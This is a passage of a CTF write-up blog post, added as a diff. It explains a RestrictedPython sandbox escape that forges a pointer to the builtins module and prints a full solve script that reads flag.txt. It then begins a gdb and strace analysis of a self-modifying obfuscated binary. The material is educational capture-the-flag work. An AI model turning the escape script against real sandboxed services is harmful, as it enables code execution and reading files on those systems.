+    <span class="n">builtins</span><span class="p">[</span><span class="s">"_getiter_"</span><span class="p">]</span> <span class="o">=</span> <span class="n">default_guarded_getiter</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"_inplacevar_"</span><span class="p">]</span> <span class="o">=</span> <span class="n">_inplacevar_</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"_write_"</span><span class="p">]</span> <span class="o">=</span> <span class="n">full_write_guard</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"bytes"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">bytes</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"chr"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"input"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">input</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"append"</span><span class="p">]</span> <span class="o">=</span> <span class="n">append</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"ord"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span>
+    <span class="n">builtins</span><span class="p">[</span><span class="s">"print_"</span><span class="p">]</span> <span class="o">=</span> <span class="k">print</span> <span class="c1"># allow printing in sandbox
+</span>    <span class="n">builtins</span><span class="p">[</span><span class="s">"type"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">type</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'starting the exploit...'</span><span class="p">)</span>
+    <span class="k">exec</span><span class="p">(</span>
+        <span class="n">compile_restricted</span><span class="p">(</span><span class="nb">file</span><span class="p">.</span><span class="n">read</span><span class="p">(),</span> <span class="n">filename</span><span class="o">=</span><span class="s">"&lt;inline-code&gt;"</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s">"exec"</span><span class="p">),</span>
+        <span class="p">{</span><span class="s">"__builtins__"</span><span class="p">:</span> <span class="n">builtins</span><span class="p">},</span>
+        <span class="bp">None</span>
+    <span class="p">)</span>
+</code></pre></div></div>
+
+<p>this specifically gates access to python’s <code class="language-plaintext highlighter-rouge">builtins</code> and replaces it with a safer version. the thing is though, this <code class="language-plaintext highlighter-rouge">builtins</code> module <em>still exists</em> in the memory, and we can find, reference, and forge a pointer to this module.</p>
+
+<p>of course, we cannot directly reference it by calling <code class="language-plaintext highlighter-rouge">id()</code>, but since it’s defined in the python heap somewhere (I Think), we can work off the assumption that it’s a fixed offset other objects, and just subtract and add accordingly - this is similar to how actual C pwn works, of course (finding libc addresses, so on so forth).</p>
+
+<p>the quote unquote ‘reference’ point i use is <code class="language-plaintext highlighter-rouge">id(0)</code>. to actually debug and find the offset i just patched in a reference to the <code class="language-plaintext highlighter-rouge">builtins</code> module in run.py as so:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">builtins</span><span class="p">[</span><span class="s">"type"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">type</span>
+<span class="n">builtins</span><span class="p">[</span><span class="s">"ref"</span><span class="p">]</span> <span class="o">=</span> <span class="n">__builtins__</span>
+</code></pre></div></div>
+
+<p>then in the solve script, we run this a few times and make sure the offset is constant.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vuln</span> <span class="o">=</span> <span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">print_</span><span class="p">(</span><span class="s">'offset to builtins &gt; '</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="nb">id</span><span class="p">(</span><span class="n">ref</span><span class="p">)))</span>
+</code></pre></div></div>
+
+<p>all that’s left to do is:</p>
+
+<p>a - create a byte object whose bytestring is a pointer to builtins.</p>
+
+<p>b - calculate the <em>offset</em> from the byte object to our forged “big” tuple.</p>
+
+<p>c - index into the tuple and retrieve our reference to builtins.</p>
+
+<p>d - win!</p>
+
+<p>now, this handwaves over a lot of concerns which a more competent pwner could’ve overcome in less than 10 minutes but i, level 2 mafia rookie, stumbled over for a few hours (making sure that the offsets are correctly calculated, making sure that the tuple is placed <em>before</em> the bytestring, dynamically accommodating for essentialy ‘random’ offsets because python fucking hates me i guess).</p>
+
+<p>but the solvepath is sound, and it does work. here is the full solvescript, for posterity:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vals</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">):</span>
+    <span class="n">vals</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">i</span><span class="p">,))</span>
+    <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">id</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="nb">id</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="o">==</span> <span class="mh">0x30</span><span class="p">:</span>
+            <span class="n">offset</span> <span class="o">=</span> <span class="n">i</span><span class="o">-</span><span class="mi">1</span>
+            <span class="k">break</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+    <span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="s">'rawr xd'</span><span class="p">)</span>
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="nb">tuple</span><span class="p">)</span>
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="nb">type</span><span class="p">)</span>
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="nb">str</span><span class="p">)</span>
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="nb">int</span><span class="p">)</span>
+<span class="n">append</span><span class="p">(</span><span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="p">],</span> <span class="nb">complex</span><span class="p">)</span>
+
+<span class="n">vuln</span> <span class="o">=</span> <span class="n">vals</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">print_</span><span class="p">(</span><span class="s">'offset to builtins &gt; '</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="nb">id</span><span class="p">(</span><span class="n">ref</span><span class="p">)))</span>
+<span class="n">print_</span><span class="p">(</span><span class="s">'type of vuln &gt;'</span><span class="p">,</span> <span class="nb">type</span><span class="p">(</span><span class="n">vuln</span><span class="p">))</span>
+<span class="n">addr_to_write</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x38010</span>
+
+<span class="n">obj</span> <span class="o">=</span> <span class="n">addr_to_write</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s">'little'</span><span class="p">)</span>
+
+<span class="n">byte_overwrite</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10000</span><span class="p">):</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+        <span class="n">f</span> <span class="o">+=</span> <span class="n">i</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)</span>
+    <span class="n">byte_overwrite</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="o">-</span> <span class="nb">id</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span>
+    <span class="k">if</span> <span class="mh">0x1000</span> <span class="o">&gt;</span> <span class="n">offset</span> <span class="o">&gt;</span> <span class="mh">0x0</span><span class="p">:</span> 
+        <span class="n">print_</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
+        <span class="k">break</span>
+
+<span class="n">f</span> <span class="o">=</span> <span class="n">byte_overwrite</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">target_idx</span> <span class="o">=</span> <span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="o">-</span> <span class="nb">id</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span>
+<span class="n">print_</span><span class="p">(</span><span class="s">'target_idx &gt; '</span><span class="p">,</span> <span class="n">target_idx</span><span class="p">);</span>
+<span class="n">print_</span><span class="p">(</span><span class="s">'target_addr &gt;'</span><span class="p">,</span> <span class="n">addr_to_write</span><span class="p">)</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">vuln</span><span class="p">[</span><span class="n">target_idx</span><span class="p">].</span><span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+<span class="n">print_</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="closing">closing</h3>
+
+<p>funny story is that this challenge took me <em>really</em> long to solve (around 8 hours) because i kept fucking up and making a bunch of mistakes. i had the primitive very early on and just spent so much time skillissuing on really trivial parts of the challenge :S</p>
+
+<p>i wanted to make my solve libc-agnostic because i couldn’t be bothered to properly figure out how the docker container treats its libcs, so i went with the pyjail-style <code class="language-plaintext highlighter-rouge">builtins</code> retrieval.</p>
+
+<p>thanks to lucas for the fun pwn!</p>
+
+<h3 id="revhelloworld">rev/helloworld</h3>
+
+<blockquote>
+  <p>name: Hello, World!</p>
+
+  <p>author: Elma</p>
+
+  <p>description: ‘I wrote my first program ever. Of course it just prints Hello World!</p>
+
+  <p>solves: 0</p>
+</blockquote>
+
+<p>very weird challenge involving some obfuscation that i did not really fully understand very well, but even without understanding everything you can get a good idea of what is going on. i kind of loosely already knew that there would be some anti-decompilation techniques so i didn’t bother decompiling anything at all and just rawdogged the asm instead.</p>
+
+<p>first things first is if we strace the binary we can see some rather suspicious calls to <code class="language-plaintext highlighter-rouge">mprotect()</code></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mprotect</span><span class="p">(</span><span class="mh">0x55f07ccc0000</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">mprotect</span><span class="p">(</span><span class="mh">0x55f07ccc0000</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="p">...</span>
+<span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Hello world!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">13</span><span class="n">Hello</span> <span class="n">world</span><span class="o">!</span>
+<span class="p">)</span>          <span class="o">=</span> <span class="mi">13</span>
+<span class="n">exit_group</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                           <span class="o">=</span> <span class="o">?</span>
+<span class="o">+++</span> <span class="n">exited</span> <span class="n">with</span> <span class="mi">0</span> <span class="o">+++</span>
+</code></pre></div></div>
+
+<p>this maps a RWX page into memory, which is assuredly not standard behaviour. we can catch any <code class="language-plaintext highlighter-rouge">mprotect</code> syscalls in gdb with <code class="language-plaintext highlighter-rouge">catch syscall mprotect</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">-&gt;</span> <span class="mh">0x555555555178</span> <span class="mi">0</span><span class="n">f05</span>                  <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x88</span><span class="o">&gt;</span>   <span class="n">syscall</span>
+    <span class="mh">0x55555555517a</span> <span class="mi">4</span><span class="n">c8d0566000000</span>        <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x8a</span><span class="o">&gt;</span>   <span class="n">lea</span>    <span class="n">r8</span><span class="p">,</span> <span class="p">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x66</span><span class="p">]</span> <span class="err">#</span> <span class="mh">0x5555555551e7</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xf7</span><span class="o">&gt;</span>
+    <span class="mh">0x555555555181</span> <span class="mi">4</span><span class="n">c8d0db0010000</span>        <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x91</span><span class="o">&gt;</span>   <span class="n">lea</span>    <span class="n">r9</span><span class="p">,</span> <span class="p">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x1b0</span><span class="p">]</span> <span class="err">#</span> <span class="mh">0x555555555338</span> <span class="o">&lt;</span><span class="n">frame_dummy</span><span class="o">&gt;</span>
+    <span class="mh">0x555555555188</span> <span class="mi">4</span><span class="n">c87f4</span>                <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x98</span><span class="o">&gt;</span>   <span class="n">xchg</span>   <span class="n">rsp</span><span class="p">,</span> <span class="n">r14</span>
+    <span class="mh">0x55555555518b</span> <span class="mi">4883</span><span class="n">ec08</span>              <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x9b</span><span class="o">&gt;</span>   <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x8</span>
+    <span class="mh">0x55555555518f</span> <span class="mi">58</span>                    <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0x9f</span><span class="o">&gt;</span>   <span class="n">pop</span>    <span class="n">rax</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Detected</span> <span class="n">syscall</span> <span class="p">(</span><span class="n">arch</span><span class="o">:</span><span class="n">X86</span><span class="p">,</span> <span class="n">mode</span><span class="o">:</span><span class="mi">64</span><span class="p">)</span>
+    <span class="n">mprotect</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">prot</span><span class="p">)</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Parameter</span>            <span class="n">Register</span>             <span class="n">Value</span>
+    <span class="n">RET</span>                  <span class="err">$</span><span class="n">rax</span>                 <span class="o">-</span>                   
+    <span class="n">NR</span>                   <span class="err">$</span><span class="n">rax</span>                 <span class="mh">0xa</span>
+    <span class="n">start</span>                <span class="err">$</span><span class="n">rdi</span>                 <span class="mh">0x0000555555555000</span>  <span class="o">-&gt;</span>  <span class="mh">0x08ec8348fa1e0ff3</span>
+    <span class="n">len</span>                  <span class="err">$</span><span class="n">rsi</span>                 <span class="mh">0x0000000000001000</span>
+    <span class="n">prot</span>                 <span class="err">$</span><span class="n">rdx</span>                 <span class="mh">0x0000000000000007</span>
+</code></pre></div></div>
+
+<p>we are in some function <code class="language-plaintext highlighter-rouge">__do_global_dtors_aux</code>, which is a function introduced by gcc to handle… something. it’s not important nor relevant, all we know is that it is assuredly not supposed to be <code class="language-plaintext highlighter-rouge">mprotect</code>ing a region of memory. what region of memory even is that anyway? inspecting in <code class="language-plaintext highlighter-rouge">vmmap</code> reveals it’s just some address to a page in the binary itself. the most important thing here is that this page includes the <code class="language-plaintext highlighter-rouge">.text</code> section of our binary, so it is RWX-mapping an area including executable code. typically this means the code is self-modifying.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Start</span>              <span class="n">End</span>                <span class="n">Size</span>               <span class="n">Offset</span>             <span class="n">Perm</span> <span class="n">Path</span>
+<span class="mh">0x0000555555555000</span> <span class="mh">0x0000555555556000</span> <span class="mh">0x0000000000001000</span> <span class="mh">0x0000000000001000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">navi</span><span class="o">/</span><span class="n">upsolves</span><span class="o">/</span><span class="n">Sieberrsec</span><span class="o">-</span><span class="n">CTF</span><span class="o">-</span><span class="mi">2025</span><span class="o">-</span><span class="n">Public</span><span class="o">/</span><span class="n">finals</span><span class="o">/</span><span class="n">re</span><span class="o">/</span><span class="n">hello_world</span><span class="o">/</span><span class="n">dist</span><span class="o">/</span><span class="n">helloworld</span><span class="p">.</span><span class="n">elf</span> <span class="o">+</span><span class="mh">0x0</span>  <span class="o">&lt;-</span>  <span class="err">$</span><span class="n">rbx</span><span class="p">,</span> <span class="err">$</span><span class="n">rdi</span><span class="p">,</span> <span class="err">$</span><span class="n">rip</span><span class="p">,</span> <span class="err">$</span><span class="n">r13</span>
+</code></pre></div></div>
+
+<p>ideally we would trace the instructions executed by the binary but there seems to be some weird control-flow-flattening kind effect, where sections of these <code class="language-plaintext highlighter-rouge">__do_global_dtors_aux</code> blocks are chained together with some trampoline in <code class="language-plaintext highlighter-rouge">__libc_start_main</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">-&gt;</span> <span class="mh">0x55555555519a</span> <span class="n">c3</span>                    <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xaa</span><span class="o">&gt;</span>   <span class="n">ret</span>   
+
+   <span class="o">-&gt;</span> <span class="mh">0x7ffff7c29ebb</span> <span class="mi">4</span><span class="n">c89f1</span>                <span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mh">0xfb</span><span class="o">&gt;</span>   <span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span> <span class="n">r14</span>
+      <span class="mh">0x7ffff7c29ebe</span> <span class="mi">4</span><span class="n">c39742408</span>            <span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mh">0xfe</span><span class="o">&gt;</span>   <span class="n">cmp</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rsp</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">],</span> <span class="n">r14</span>
+      <span class="mh">0x7ffff7c29ec3</span> <span class="mf">75e3</span>                  <span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mh">0x103</span><span class="o">&gt;</span>   <span class="n">jne</span>    <span class="mh">0x7ffff7c29ea8</span> <span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mh">0xe8</span><span class="o">&gt;</span>
+      <span class="mh">0x7ffff7c29ec5</span> <span class="n">e959ffffff</span>            <span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mh">0x105</span><span class="o">&gt;</span>   <span class="n">jmp</span>    <span class="mh">0x7ffff7c29e23</span> <span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mh">0x63</span><span class="o">&gt;</span>
+      <span class="mh">0x7ffff7c29eca</span> <span class="mi">488</span><span class="n">b1df7ff1e00</span>        <span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mh">0x10a</span><span class="o">&gt;</span>   <span class="n">mov</span>    <span class="n">rbx</span><span class="p">,</span> <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x1efff7</span><span class="p">]</span> <span class="err">#</span> <span class="mh">0x7ffff7e19ec8</span>
+      <span class="mh">0x7ffff7c29ed1</span> <span class="mi">498</span><span class="n">b3424</span>              <span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mh">0x111</span><span class="o">&gt;</span>   <span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span> <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r12</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>indeed, after our <code class="language-plaintext highlighter-rouge">mprotect</code> is performed, it does <em>something</em> w/ the registers, rets back to <code class="language-plaintext highlighter-rouge">__libc_start_main</code>, and eventually <code class="language-plaintext highlighter-rouge">__libc_start_main</code> jumps back into another section of code in <code class="language-plaintext highlighter-rouge">__do_global_dtors_aux</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">-&gt;</span> <span class="mh">0x7ffff7c29eb9</span> <span class="n">ff11</span>                  <span class="o">&lt;</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mh">0xf9</span><span class="o">&gt;</span>   <span class="n">call</span>   <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rcx</span><span class="p">]</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xc0</span><span class="o">&gt;</span>
+
+   <span class="o">-&gt;</span> <span class="mh">0x5555555551b0</span> <span class="mi">8</span><span class="n">a03</span>                  <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xc0</span><span class="o">&gt;</span>   <span class="n">mov</span>    <span class="n">al</span><span class="p">,</span> <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbx</span><span class="p">]</span>
+      <span class="mh">0x5555555551b2</span> <span class="mi">413000</span>                <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xc2</span><span class="o">&gt;</span>   <span class="n">xor</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r8</span><span class="p">],</span> <span class="n">al</span>
+      <span class="mh">0x5555555551b5</span> <span class="mi">48</span><span class="n">ffc3</span>                <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xc5</span><span class="o">&gt;</span>   <span class="n">inc</span>    <span class="n">rbx</span>
+      <span class="mh">0x5555555551b8</span> <span class="mi">49</span><span class="n">ffc0</span>                <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xc8</span><span class="o">&gt;</span>   <span class="n">inc</span>    <span class="n">r8</span>
+      <span class="mh">0x5555555551bb</span> <span class="mi">4</span><span class="n">c87f4</span>                <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xcb</span><span class="o">&gt;</span>   <span class="n">xchg</span>   <span class="n">rsp</span><span class="p">,</span> <span class="n">r14</span>
+      <span class="mh">0x5555555551be</span> <span class="mi">4883</span><span class="n">ec08</span>              <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xce</span><span class="o">&gt;</span>   <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x8</span>
+</code></pre></div></div>
+
+<p>oh well. the exact mechanics of this dont really matter to us. we can just manually step through by spamming <code class="language-plaintext highlighter-rouge">stepi</code>s until we get back to our relevant code blocks.</p>
+
+<p>and .. here we see a very interesting codeblock, actually.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="mh">0x5555555551ab</span> <span class="mi">8</span><span class="n">d5050</span>                <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xbb</span><span class="o">&gt;</span>   <span class="n">lea</span>    <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="mh">0x50</span><span class="p">]</span>
+    <span class="mh">0x5555555551ae</span> <span class="mi">8</span><span class="n">a00</span>                  <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xbe</span><span class="o">&gt;</span>   <span class="n">mov</span>    <span class="n">al</span><span class="p">,</span> <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
+ <span class="o">-&gt;</span> <span class="mh">0x5555555551b0</span> <span class="mi">8</span><span class="n">a03</span>                  <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xc0</span><span class="o">&gt;</span>   <span class="n">mov</span>    <span class="n">al</span><span class="p">,</span> <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbx</span><span class="p">]</span>
+    <span class="mh">0x5555555551b2</span> <span class="mi">413000</span>                <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xc2</span><span class="o">&gt;</span>   <span class="n">xor</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r8</span><span class="p">],</span> <span class="n">al</span>
+    <span class="mh">0x5555555551b5</span> <span class="mi">48</span><span class="n">ffc3</span>                <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xc5</span><span class="o">&gt;</span>   <span class="n">inc</span>    <span class="n">rbx</span>
+    <span class="mh">0x5555555551b8</span> <span class="mi">49</span><span class="n">ffc0</span>                <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xc8</span><span class="o">&gt;</span>   <span class="n">inc</span>    <span class="n">r8</span>
+    <span class="mh">0x5555555551bb</span> <span class="mi">4</span><span class="n">c87f4</span>                <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xcb</span><span class="o">&gt;</span>   <span class="n">xchg</span>   <span class="n">rsp</span><span class="p">,</span> <span class="n">r14</span>
+    <span class="mh">0x5555555551be</span> <span class="mi">4883</span><span class="n">ec08</span>              <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mh">0xce</span><span class="o">&gt;</span>   <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x8</span>
+<span class="o">-----------------------------------</span> <span class="n">memory</span> <span class="n">access</span><span class="o">:</span> <span class="err">$</span><span class="n">rbx</span> <span class="o">=</span> <span class="mh">0x555555555338</span> <span class="o">----</span>
+<span class="err">$</span><span class="n">rbx</span><span class="o">+</span> <span class="mh">0x555555555338</span><span class="o">|+</span><span class="mh">0x0000</span><span class="o">|+</span><span class="mo">000</span><span class="o">:</span> <span class="mh">0x48f4874cfa1e0ff3</span>
+      <span class="mh">0x555555555340</span><span class="o">|+</span><span class="mh">0x0008</span><span class="o">|+</span><span class="mo">001</span><span class="o">:</span> <span class="mh">0xfe1605485808ec83</span>
+      <span class="mh">0x555555555348</span><span class="o">|+</span><span class="mh">0x0010</span><span class="o">|+</span><span class="mo">002</span><span class="o">:</span> <span class="mh">0x5de9f4874c50ffff</span>
+      <span class="mh">0x555555555350</span><span class="o">|+</span><span class="mh">0x0018</span><span class="o">|+</span><span class="mo">003</span><span class="o">:</span> <span class="mh">0x48e5894855fffffd</span>
+</code></pre></div></div>
+
+<p>note the memory access and the <code class="language-plaintext highlighter-rouge">xor BYTE PTR [r8], al</code> instruction - these addresses are in the page marked RWX, and here we are, xoring the bytes with some key somewhere. we can inspect more of the asm, seeing that it increments the ptr in r8 and xors the bytes in a loop until r8 == r9.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">16</span><span class="n">i</span> <span class="err">$</span><span class="n">rip</span>
+<span class="o">=&gt;</span> <span class="mh">0x5555555551b0</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">al</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbx</span><span class="p">]</span>
+   <span class="mh">0x5555555551b2</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">194</span><span class="o">&gt;:</span>	<span class="n">xor</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r8</span><span class="p">],</span><span class="n">al</span>
+   <span class="mh">0x5555555551b5</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">197</span><span class="o">&gt;:</span>	<span class="n">inc</span>    <span class="n">rbx</span>
+   <span class="mh">0x5555555551b8</span> <span class="o">&lt;</span><span class="n">__do_global_dtors_aux</span><span class="o">+</span><span class="mi">200</span><span class="o">&gt;:</span>	<span class="n">inc</span>    <span class="n">r8</span>
